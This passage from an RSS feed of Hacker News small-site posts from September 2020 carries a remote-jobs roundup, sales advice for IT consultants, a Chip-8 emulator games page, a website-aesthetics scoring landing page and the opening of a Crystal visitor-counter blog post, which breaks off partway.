<![CDATA[Show HN: I made a scraper that finds the Best Remote Jobs Every Week on the web]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24526323">thread link</a>) | @xoelop
<br/>
September 19, 2020 | https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/ | <a href="https://web.archive.org/web/*/https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Hey everyone!</p><p>I'm <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">Xoel</a>, the creator of <a href="https://noicejobs.com/" rel="noopener noreferrer">NoiceJobs.com</a>. On this blog, we'll post the best remote jobs found every week, scraped, aggregated and curated from pretty much all job boards in the Internet.</p><p>For example...</p><ul> <li> 👉 🏝 <a target="blank" href="https://bit.ly/2RxVom5">Senior Software Developer</a> at <b>Jupiter</b>
<br>
<b>$70,000 - $120,000 USD + Equity depending on experience</b>
<br> 🏡 Hiring in EU, Canada, US, Mexico, Central &amp; South America, Rest of Europe  <p>• We're looking for someone to help <strong>build and support new features</strong> as we scale out the product and company. You will be primarily working with <strong>React, React Native, Node.js</strong>, and <strong>GraphQL</strong>.<br>• We're looking for someone who is particularly interested in creating systems within the constraints of a <strong>start-up</strong>.<br>• And finally: we're <strong>bootstrapped</strong>, so far, <strong>building a sustainable business we all want to work at</strong>.</p>
<br> 📨 Wanna get an intro with Rich, CTO at Jupiter? <a href="https://airtable.com/shrzoNF0Lcz50u9oh?prefill_open_for_offers=TRUE%20&amp;prefill_extra_info_reported=I%27m%20interested%20in%20the%20Senior%20Software%20Developer%20position%20at%20Jupiter.%0A%0AThis%20is%20why%20I%20think%20I%27m%20a%20great%20candidate%20for%20this%20position%3A" target="_blank" rel="noopener noreferrer">Join NoiceJobs</a> if you haven't yet or <a href="https://blog.noicejobs.com/cdn-cgi/l/email-protection#730b1c161f331d1c1a1016191c11005d101c1e4c000611191610074e3a1d07011c564143151c01564143071b1656414320161d1a1c01564143201c150704120116564143371605161f1c031601564143031c001a071a1c1d56414312075641433906031a071601" target="_blank" rel="noopener noreferrer">email us</a> if you're a member already.
<br> </li> </ul>
<p> Wanna promote your job on NoiceJobs? <a href="#hiring">Check this out</a> </p><p>This post will make it easier to navigate the blog and all the different categories. Jump to...</p><ul> <li> <a href="#Engineering">🖥 Best Remote Engineering jobs found this week</a> </li> <li> <a href="#Product">🖼 Best Remote Product jobs found this week</a> </li> <li> <a href="#Business">💵 Best Remote Business jobs found this week</a> </li> <li> <a href="#Other">💼 Best Other Remote jobs found this week</a> </li> </ul>
<p>BTW: now you can also get these jobs every week <a href="#newsletter">via email!</a></p><h2 id="-best-remote-engineering-jobs-found-this-week">🖥 Best Remote Engineering jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cto-26-tech-lead-remote-jobs-between-sep-11-and-sep-18/">CTO &amp; Tech Lead jobs</a><br><a href="https://blog.noicejobs.com/best-senior-engineering-manager-remote-jobs-between-sep-11-and-sep-18/">Engineering Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-fullstack-remote-jobs-between-sep-11-and-sep-18/">Fullstack jobs</a><br><a href="https://blog.noicejobs.com/best-senior-frontend-remote-jobs-between-sep-11-and-sep-18/">Frontend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-backend-remote-jobs-between-sep-11-and-sep-18/">Backend jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sre-26-devops-remote-jobs-between-sep-11-and-sep-18/">SRE &amp; Devops jobs</a><br><a href="https://blog.noicejobs.com/best-senior-infosec-remote-jobs-between-sep-11-and-sep-18/">Infosec jobs</a><br><a href="https://blog.noicejobs.com/best-senior-mobile-remote-jobs-between-sep-11-and-sep-18/">Mobile jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ios-remote-jobs-between-sep-11-and-sep-18/">iOS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-android-remote-jobs-between-sep-11-and-sep-18/">Android jobs</a><br><a href="https://blog.noicejobs.com/best-senior-python-remote-jobs-between-sep-11-and-sep-18/">Python jobs</a><br><a href="https://blog.noicejobs.com/best-senior-javascript-remote-jobs-between-sep-11-and-sep-18/">Javascript jobs</a><br><a href="https://blog.noicejobs.com/best-senior-java-remote-jobs-between-sep-11-and-sep-18/">Java jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rails-ruby-remote-jobs-between-sep-11-and-sep-18-2/">Rails/Ruby jobs</a><br><a href="https://blog.noicejobs.com/best-senior-go-remote-jobs-between-sep-11-and-sep-18/">Go jobs</a><br><a href="https://blog.noicejobs.com/best-senior-rust-remote-jobs-between-sep-11-and-sep-18/">Rust jobs</a><br><a href="https://blog.noicejobs.com/best-senior-php-remote-jobs-between-sep-11-and-sep-18/">PHP jobs</a><br><a href="https://blog.noicejobs.com/best-senior-wordpress-remote-jobs-between-sep-11-and-sep-18/">Wordpress jobs</a><br><a href="https://blog.noicejobs.com/best-senior-qa-remote-jobs-between-sep-11-and-sep-18/">QA jobs</a><br><a href="https://blog.noicejobs.com/best-senior-solutions-architect-remote-jobs-between-sep-11-and-sep-18/">Solutions Architect jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-science-26-ml-remote-jobs-between-sep-11-and-sep-18-2/">Data Science &amp; ML jobs</a><br><a href="https://blog.noicejobs.com/best-senior-nlp-26-nlg-remote-jobs-between-sep-11-and-sep-18-2/">NLP &amp; NLG jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-engineering-26-big-data-remote-jobs-between-sep-11-and-sep-18-2/">Data Engineering &amp; Big Data jobs</a><br><a href="https://blog.noicejobs.com/best-senior-shopify-remote-jobs-between-sep-11-and-sep-18/">Shopify jobs</a><br><a href="https://blog.noicejobs.com/best-senior-gis-remote-jobs-between-sep-11-and-sep-18/">GIS jobs</a><br><a href="https://blog.noicejobs.com/best-senior-react-remote-jobs-between-sep-11-and-sep-18/">React jobs</a><br><a href="https://blog.noicejobs.com/best-senior-vue-remote-jobs-between-sep-11-and-sep-18/">Vue jobs</a><br><a href="https://blog.noicejobs.com/best-devrel-remote-jobs-found-between-sep-02-and-sep-09/">DevRel jobs</a><br><a href="https://blog.noicejobs.com/best-senior-game-dev-26-design-remote-jobs-between-sep-11-and-sep-18-2/">Game Dev &amp; Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-haskell-remote-jobs-between-sep-11-and-sep-18/">Haskell jobs</a><br><a href="https://blog.noicejobs.com/best-senior-scala-remote-jobs-between-sep-11-and-sep-18/">Scala jobs</a><br><a href="https://blog.noicejobs.com/best-generalist-remote-jobs-between-sep-11-and-sep-18/">Generalist jobs</a><br><a href="https://blog.noicejobs.com/best-senior-c-2b-2b-remote-jobs-between-sep-11-and-sep-18-2/">C++ jobs</a><br><a href="https://blog.noicejobs.com/best-senior-net-remote-jobs-between-sep-11-and-sep-18-2/">.NET jobs</a><br></p><h2 id="-best-remote-product-jobs-found-this-week">🖼 Best Remote Product jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-cpo-remote-jobs-between-sep-11-and-sep-18/">CPO jobs</a><br><a href="https://blog.noicejobs.com/best-senior-product-manager-remote-jobs-between-sep-11-and-sep-18/">Product Manager jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ux-26-product-design-remote-jobs-between-sep-11-and-sep-18/">UX &amp; Product Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ui-design-remote-jobs-between-sep-11-and-sep-18/">UI Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-art-26-visual-design-remote-jobs-between-sep-11-and-sep-18/">Art &amp; Visual Design jobs</a><br><a href="https://blog.noicejobs.com/best-senior-copywriting-remote-jobs-between-sep-11-and-sep-18/">Copywriting jobs</a><br><a href="https://blog.noicejobs.com/best-senior-video-editing-remote-jobs-between-sep-11-and-sep-18/">Video Editing jobs</a><br></p><h2 id="-best-remote-business-jobs-found-this-week">💵 Best Remote Business jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-sales-remote-jobs-between-sep-11-and-sep-18/">Sales jobs</a><br><a href="https://blog.noicejobs.com/best-senior-sdr-remote-jobs-between-sep-11-and-sep-18/">SDR jobs</a><br><a href="https://blog.noicejobs.com/best-senior-legal-remote-jobs-between-sep-11-and-sep-18/">Legal jobs</a><br><a href="https://blog.noicejobs.com/best-senior-operations-remote-jobs-between-sep-11-and-sep-18/">Operations jobs</a><br><a href="https://blog.noicejobs.com/best-senior-customer-support-remote-jobs-between-sep-11-and-sep-18/">Customer Support jobs</a><br><a href="https://blog.noicejobs.com/best-senior-seo-2c-sem-remote-jobs-between-sep-11-and-sep-18/">SEO, SEM jobs</a><br><a href="https://blog.noicejobs.com/best-senior-marketing-remote-jobs-between-sep-11-and-sep-18/">Marketing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-growth-remote-jobs-between-sep-11-and-sep-18/">Growth jobs</a><br><a href="https://blog.noicejobs.com/best-senior-agile-scrum-remote-jobs-between-sep-11-and-sep-18-2/">Agile/Scrum jobs</a><br><a href="https://blog.noicejobs.com/best-senior-data-business-analyst-remote-jobs-between-sep-11-and-sep-18-2/">Data/Business Analyst jobs</a><br><a href="https://blog.noicejobs.com/best-senior-finance-26-investing-remote-jobs-between-sep-11-and-sep-18-2/">Finance &amp; Investing jobs</a><br><a href="https://blog.noicejobs.com/best-senior-accounting-26-bookkeping-remote-jobs-between-sep-11-and-sep-18-2/">Accounting &amp; Bookkeping jobs</a><br><a href="https://blog.noicejobs.com/best-senior-ecommerce-remote-jobs-between-sep-11-and-sep-18/">Ecommerce jobs</a><br><a href="https://blog.noicejobs.com/best-senior-social-media-remote-jobs-between-sep-11-and-sep-18/">Social Media jobs</a><br></p><h2 id="-best-other-remote-jobs-found-this-week">💼 Best Other Remote jobs found this week</h2><p><a href="https://blog.noicejobs.com/best-senior-software-contract-26-freelance-remote-jobs-between-sep-11-and-sep-18/">Software Contract &amp; Freelance jobs</a><br><a href="https://blog.noicejobs.com/best-senior-software-part-time-remote-jobs-between-sep-11-and-sep-18/">Software Part-time jobs</a><br><a href="https://blog.noicejobs.com/best-junior-remote-jobs-between-sep-11-and-sep-18/">Junior jobs</a><br></p>
<h2>📩 Get these jobs as weekly newsletters</h2>

<h2 id="hiring"> Are you hiring remotely?
</h2>
<p> 📣 If so, you can now <a href="https://airtable.com/shreWkzRKtq6oQFiK" target="_blank" rel="noopener noreferrer">post a job on NoiceJobs</a> to reach up to thousands of talented remote workers.
</p>
<p> Some numbers on NoiceJobs' audience:
</p>
<ul> <li> More than <b>3000 subscribers</b> on our <a href="https://t.me/noicejobs" target="_blank" rel="noopener noreferrer">Telegram channels</a> </li> <li> <b>Hundreds of people registered</b> on NoiceJobs and get these posts weekly </li> <li> This blog (launched on September 9) had <b><span id="pageviews"></span> page views</b> in the last month (verified by <a href="https://referral.simpleanalytics.com/xoel" target="_blank" rel="noopener noreferrer">Simple Analytics</a>). </li> <li> Our traffic analytics are 100% open. <a href="https://simpleanalytics.com/blog.noicejobs.com" target="_blank" rel="noopener noreferrer">Check them out here 👀</a> and see our pageviews in the graph below </li>
</ul>
<div> <p> A cool graph with our visits would go here, but ad blockers don't like the Simple Analytics embed. Disable yours if you'd like to view it :) </p>
</div>
<h3 id="that-s-it-">That's it!</h3><p>I also share jobs like these in these <a href="https://t.me/NoiceJobs">Telegram channels</a>. More than 3,000 people are subscribed to them.</p><p>Have a good weekend!</p><p>Xoel - <a href="https://twitter.com/xoelipedes" rel="noopener noreferrer">I'm on Twitter too. Say hi!</a></p>
</div>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.noicejobs.com/best-remote-jobs-in-the-world-between-sep-11-and-sep-18/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526323</guid>
            <pubDate>Sat, 19 Sep 2020 09:51:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Way to Find Clients for Your IT Consulting Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526274">thread link</a>) | @kureikain
<br/>
September 19, 2020 | https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/ | <a href="https://web.archive.org/web/*/https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-197">

    

	<div>

		
<p>As an experienced software engineer or IT professional, you have spent many years building up your expertise and your skill-set. You’ve built many solutions and you have solved many problems for clients of various sizes. You have finally decided to turn your expertise into a proper business and escape the rat race once and for all. </p>



<p>Perhaps you’ve even put a team together and have managed to secure a client or two with some decent projects. Everything is looking promising. </p>



<p>Except you run into a little problem. </p>



<p>You have NO idea how to get more clients. </p>



<p>The B2B sales process for technology products and services is complicated, it requires reaching out to the right people who are in a position to make a decision and navigating a complex sales cycle, and you don’t even know where to begin. In fact, you hate this part You really really do. You’re a technology person after all. You’re brilliant at what you do. Surely you shouldn’t have to engage in low-life scummy sales tactics to find clients. You really hate this part. </p>



<p>But you have a business now, so you try. You send out some cold e-mails. You pitch some people on LinkedIn. You spend some money on social media ads, and it just goes down a drain. And then…. nothing. Zero. You have NO new clients. You’re in a rut. You begin to panic.</p>



<hr>



<p>But there is good news. </p>



<p>Let’s take a step back. Whenever you find yourself in a rut, always take a step back. Take a few deep breaths, calm yourself down for a moment, and try to get more general. Try to look at the big picture. You have to put the problems aside for a moment so you can clear your mind and take a fresh look.</p>



<p>The good news is that there is a clear path to what you want.</p>



<p>In fact, you already have the components in place.</p>



<p>The first step is to realise that your professional career so far has given you a valuable competitive advantage.</p>



<p>You now know certain things and can do certain things that very few people on the planet know or can do. </p>



<p>The second step is to realise there is demand for these special skills and knowledge you possess.</p>



<p>There are business owners, managers, decision makers, leaders who are, right now, in need of what you know and what you can do for them. More importantly, many of them have both the willingness and the ability to compensate you generously if you can help them solve specific challenges they are currently facing, or specific goals they are currently committed to achieving.</p>



<p>The third step is to realise that you already have direct access to most of these people. It’s called LinkedIn (or, more broadly, social media).</p>



<p>As you can see, I was not being wishy-washy when I said the components are already in place. All 3 of the above are indeed already in place.</p>



<p>The path to what you want is through aligning yourself – your internal beliefs, your presentation and the messaging you put out – so you position yourself to be the natural choice for those seeking your expertise.</p>



<p>And yes, you do have to learn to sell. But this doesn’t have to be so intimidating and you certainly don’t have to feel like a low-life doing this. So take another deep breath, and allow yourself to get friendly with sales for a moment. Soon you will be best friends – better than you know. </p>



<p>I’ll give you a blueprint to follow, right here in this post. And in the future I’ll go into many more details, but this here should be more than enough to get you started. You shouldn’t need ANYTHING else, don’t get yourself overwhelmed. It’s actually very simple and even easy. </p>



<p>First I’ll tell you what NOT to do. </p>



<p>Then I’ll give you a few basic steps to follow.</p>



<hr>



<p>First and foremost – DO NOT go hire anyone to do this for you. Trust me on this one. No one can market or sell your product for you before you’ve mastered this process yourself first. You MUST learn to sell your own products and services, there is no way around it. What’s more – no one can do it better than you. You KNOW what you’re good at. You KNOW what you’ve been able to do for other clients before. You KNOW what problems you’ve been able to solve. You’ve SEEN people and businesses struggle and make wrong decisions and regret them and you KNOW how to do this right. You know how to do it better. No one else can communicate this better than you. No one can be more convincing. No one can connect with your future clients better than you. </p>



<p>Second, avoid paid advertising before you’ve learned how to generate high-ticket sales without it. Paid ads are an amplifier. If you’re making zero sales right now, the result of putting lots and lots of money in paid ads will be lots and lots of money multiplied by zero. Don’t waste your time and money doing this. I’ve been there. It ain’t pretty. </p>



<p>Repeat after me: Paid ads and sales people are for scaling only. Once you’ve got your offer and your messaging down to a proven working system, you can then pay for ads and hire sales people to go 10x or 100x bigger. But you are not ready for this. Delay this phase as long as possible. When the time comes, you will know it. </p>



<p>Finally, for the love kittens, please don’t go spamming people left and right with your offer. Don’t send e-mails. Don’t talk to strangers on messenger. Don’t call them on the phone. Don’t ask for appointments. Just don’t, ok? Don’t do it. No one likes that. It won’t get you anywhere. </p>



<p>There IS a better way.</p>



<hr>



<p>So here is what to do.</p>



<p>You can get started today, easily. And you can see results quickly, without spending a fortune on anyone or anything.</p>



<p>Your biggest problem right now is obscurity. No one knows you exist. Simple as that.</p>



<p>To start getting more sales, you have to get out there where relevant people can see you so that A) they know you exist and B) you get an opportunity to speak directly to their current pains and frustrations.</p>



<p>As tacky as it sounds, social media turns out to be useful for this.</p>



<p>I’ve found that LinkedIn can be pretty great for B2B sales – but I’ve also seen people get good results with high-ticket sales on Facebook as well. (Once again, though – DO NOT just go spamming people on LinkedIn! Keep calm and read on.)</p>



<p>There is a structure and sequence to the approach. You have to do things in the right order  and you have to get through some things first, but it’s easy, there’s no big expenses involved, and you can start getting results in weeks or even days if you do this right.</p>



<p>The first steps go like this:</p>



<ol><li>Get as much clarity as you can on who your ideal clients are and what your main offer is. I think you already have a good idea about this, but always worth thinking harder about it and putting it in writing for yourself and your team. Make sure to think about your ideal client as A PERSON, even if we’re talking billion-dollar corporations here. At the end of the day someone has to make a decision and write a check.</li><li>Prime your LinkedIn profile. Make it look professional. Use the tag-line to speak directly to your ideal buyer (this requires some creativity and it’s a bit of a process – don’t be afraid to keep changing it, but once you find something that works, stick with it.) Use the longer “About” section to do more of the same. You have to basically turn that into a mini sales letter. Don’t go into many technical details – always write as if it’s coming out of your ideal client’s head. Think of their situation, their current struggles and challenges, the urgency of the problem, and how you can relieve that. Talk about what they will gain from working with you and the amount of time, effort and money they will save.</li><li>Start adding very targeted connections – on a daily basis. If you wish, you can pay for LinkedIn’s Sales Navigator, but I’ve found that the basic search works good enough for me. Every day run a search for people who may be in a position to make decisions about your offer (or go through your LinkedIn network recommendations) and just send out connection requests to 5 – 10 people each day day (but don’t go crazy and start adding everyone indiscriminately.) You can add a little personalisation note, but I’m not sure it makes much of a difference with most people. Your profile (and especially the tag-line) should be able to speak for itself. There are people who use LinkedIn for networking and they will usually accept your connection request. Then there are people who don’t like connecting with strangers and they will ignore you. Don’t make a big deal out of it, don’t take it personally, just stick to the process and turn it into a habit.</li><li>While you are growing your network, start making more regular posts. You should aim for once a day, on average. You can do more (but not much more) or less (but not much less). In your posts, you can do a number of different things, but the whole point is to imagine you are speaking directly to your ideal clients. Don’t be too sales-y all the time, just speak from your expertise and experience. Talk about their problems and your solution to them. Talk about what you’ve done for other similar clients and the specific benefits they’ve experienced. Talk especially about saving time – that’s a big one. </li><li>Don’t be discouraged if you get little to no interactions with your posts at first! This DOESN’T mean people aren’t reading your content. Many people (especially busy people) will not react to your content, but if it’s relevant they WILL read it. When people do start interacting with your posts, feel free to start conversations with them. Keep the conversation exploratory and see how you can be of service. If you can get them on the phone, even better. Just keep this in mind: your first job is NOT to try to sell them anything. It’s to understand whether or not you’re a good fit for working together and to genuinely give them the advice that’s best for them. If this happens to mean working with you, great – don’t be shy about it either. </li><li>Once every few weeks, make a post with a very direct offer, …</li></ol></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/">https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</a></em></p>]]>
            </description>
            <link>https://corebrief.com/2020/09/09/a-better-way-to-find-clients-for-your-it-consulting-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526274</guid>
            <pubDate>Sat, 19 Sep 2020 09:38:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chip8 Emulator Games]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526006">thread link</a>) | @spencerwgreene
<br/>
September 19, 2020 | https://ajor.co.uk/chip8/ | <a href="https://web.archive.org/web/*/https://ajor.co.uk/chip8/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><a href="https://ajor.co.uk/chip8/chip8.html">Play in your browser with your own Chip8 games</a>, or select a game from below.</p>

<h2 id="chip-8-games">Chip-8 games:</h2>

<p><a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/CONNECT4&amp;speed=1"><img src="https://ajor.co.uk/images/chip8/connect4.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/BLINKY&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/blinky.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/BRIX&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/brix.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/PONG2&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/pong.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/TETRIS&amp;speed=10"><img src="https://ajor.co.uk/images/chip8/tetris.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/HIDDEN&amp;speed=1"><img src="https://ajor.co.uk/images/chip8/hidden.png" alt="Chip8 screenshot"></a></p>

<h2 id="super-chip-games">Super-Chip games:</h2>

<p><a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/CAR&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-car.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/PIPER&amp;speed=20"><img src="https://ajor.co.uk/images/chip8/super-piper.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/ALIEN&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-alien.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/ANT&amp;speed=30"><img src="https://ajor.co.uk/images/chip8/super-ant.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/SPACEFIG&amp;speed=50"><img src="https://ajor.co.uk/images/chip8/super-spacefig.png" alt="Chip8 screenshot"></a>
<a href="https://ajor.co.uk/chip8/chip8.html?rom=/chip8/games/WORM3&amp;speed=20"><img src="https://ajor.co.uk/images/chip8/super-worm.png" alt="Chip8 screenshot"></a></p>

<h2 id="keyboard-map">Keyboard map</h2>
<div><div><pre><code>Chip-8:    QWERTY keyboard:

1 2 3 C        1 2 3 4
4 5 6 D        Q W E R
7 8 9 E        A S D F
A 0 B F        Z X C V
</code></pre></div></div>

<p>Pressing Enter resets the emulator.</p>

<p>All the games seem to have different controls, so you’ll just have to try them and see what works.</p>

  </div></div>]]>
            </description>
            <link>https://ajor.co.uk/chip8/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526006</guid>
            <pubDate>Sat, 19 Sep 2020 08:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: How attractive is your website? Check using Visual Mind AI]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 160 (<a href="https://news.ycombinator.com/item?id=24525995">thread link</a>) | @myraahio
<br/>
September 19, 2020 | https://myraah.io/visualmind | <a href="https://web.archive.org/web/*/https://myraah.io/visualmind">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              
              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website’s appeal within a split second.  This first impression is influential enough to later affect their opinions of a site’s usability and trustworthiness.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind ?</h4>
              <p>Visual Mind is an AI engine specifically designed for understanding and scoring visual appearance of a website. Visual Mind has analyzed over a million websites to achieve an accuracy rate of over 97%.</p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
              
              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you “fast-tested” your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score – provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>
              <p><a href="https://myraah.io/index.php/visualmind">Check Your VM SCORE</a></p>
            </div>
          </div> <!-- col -->
        </div><div>
          <div>
            <div>
				<h4>Want to explore more – we recommend</h4>
              <p>A.  Bauerly, M., and Liu, Y. Effects of Symmetry and Number of Compositional Elements on Interface and Design Aesthetics. Int. Journal of Human-Computer Interaction 3 (2008).</p>
              <p>B. Cyr, D. Modeling Website Design across Cultures: Relationships to Trust, Satisfaction and E-loyalty. Journal of Management Information Systems 24, 4 (2008)</p>
              <p>C. Everard, A., and Galletta, D. How presentation flaws affect perceived site quality, trust, and intention to purchase from an online store. Journal of Management Information Systems 22, 3 (2006)</p>
              <p>D. Geissler, G., Zinkhan, G., and Watson, R. The Influence of Home Page Complexity on Consumer Attention, Attitudes, and Purchase Intent. Journal of Advertising 35, 2 (2006)</p>
              <p>E. Hall, R. H., and Hanna, P. The Impact of Web Page Text-background Colour Combinations on Readability,Retention, Aesthetics and Behavioural Intention. Behaviour &amp; Information Technology 23, 3 (2004)</p>
              <p>G. Lindgaard, G., Fernandes, G., Dudek, C., and Brown, J. Attention Web Designers: You Have 50 Milliseconds to Make a Good First Impression! Behaviour &amp; Information Technology 25, 2 (2006)</p>
              <p>H. Michailidou, E., Harper, S., and Bechhofer, S. Visual Complexity and Aesthetic Perception of Web Pages. Proc. Design of Communication (2008)</p>
              <p>I. Tuch, A. N., Bargas-Avila, J. A., and Opwis, K. Symmetry and Aesthetics in Website Design: It’s a Man’s Business. Computers in Human Behavior 26, 6 (2010)</p>
              
			</div>
          </div> <!-- col -->
        </div></div>]]>
            </description>
            <link>https://myraah.io/visualmind</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525995</guid>
            <pubDate>Sat, 19 Sep 2020 08:13:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CrazyFast Crystal based 88x31 visitor counter img generator brought back to 2020]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525873">thread link</a>) | @gcds
<br/>
September 19, 2020 | https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1502570149819-b2260483d302?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: A Crystal based super fast visitor counter">
            </figure>

            <section>
                <div>
                    <p>I have taken this week's holidays with the plan that the Overkill Workbench materials would be delivered today, but in the end, it will be delivered on Sunday, so I have a lot of free time on my hands.</p><p>Yesterday, while talking with some friends, I remembered old good &lt;2008 websites, portals, and how we created them; one of the most prominent features I loved about that period was 88x31, and 120x60 sized Ad's/Counters and other goodies. It was always a fight between website authors fighting for a higher number of page visits and similar metrics. Nowadays, everything is hidden and typical, only seen by webmasters on Google Analytics and similar tools.</p><p>So today's my evening project is <a href="https://crystal-lang.org/">Crystal</a> language-based 88x31 website visitor counter image rendered entirely in <a href="https://crystal-lang.org/">Crystal</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-60.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-60.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-60.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-60.png 1600w, https://www.techprowd.com/content/images/2020/09/image-60.png 1754w" sizes="(min-width: 720px) 720px"></figure><h2 id="requirements-">Requirements:</h2><ul><li>A single endpoint would return 88x31 sized png with numbers</li><li>Provide two numbers, one unique visitor count, and other total visits.</li><li>Do not depend on external libraries for image generation.</li><li>Use the least amount of resources like memory and disk space. (Maybe one day my blog will be viral, who knows)</li><li>Most important, be as fast as possible!</li></ul><h2 id="architecture-">Architecture:</h2><p>The plan is to run the crystal internal HTTP server without any overhangs and host it on Heroku free plan.</p><figure><img 